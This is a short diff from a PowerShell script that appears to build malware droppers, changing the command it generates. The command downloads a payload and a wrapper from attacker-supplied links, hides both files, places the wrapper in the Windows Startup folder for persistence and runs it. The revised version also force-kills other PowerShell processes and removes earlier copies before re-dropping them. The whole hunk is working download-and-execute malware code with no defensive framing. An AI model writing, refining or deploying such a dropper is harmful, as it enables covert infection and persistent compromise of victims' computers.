@@ -710,7 +710,7 @@ function Init-Script {
     $payloadPath = Read-Host "Payload path"
     $wrapperName = Read-Host "Wrapper name"
 
-    $psCommand = "`$startup=[Environment]::GetFolderPath('Startup'); `$appdata=[Environment]::GetFolderPath('ApplicationData'); iwr '$payloadLink' -OutFile (Join-Path `$appdata '$payloadPath'); attrib +h (Join-Path `$appdata '$payloadPath'); iwr '$wrapperLink' -OutFile (Join-Path `$startup '$wrapperName'); attrib +h (Join-Path `$startup '$wrapperName'); & (Join-Path `$startup '$wrapperName'); exit"
+    $psCommand = "`$s=[Environment]::GetFolderPath('Startup'); `$a=[Environment]::GetFolderPath('ApplicationData'); Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$PID} | Stop-Process -Force; `$b=(Join-Path `$a '$payloadPath'); `$v=(Join-Path `$s '$wrapperName'); Remove-Item `$b,`$v -Force -ErrorAction SilentlyContinue; iwr '$payloadLink' -OutFile `$b; attrib +h `$b; iwr '$wrapperLink' -OutFile `$v; attrib +h `$v; & `$v; exit"
 
     $batchContent = "powershell -NoProfile -Command `"$psCommand`""
 
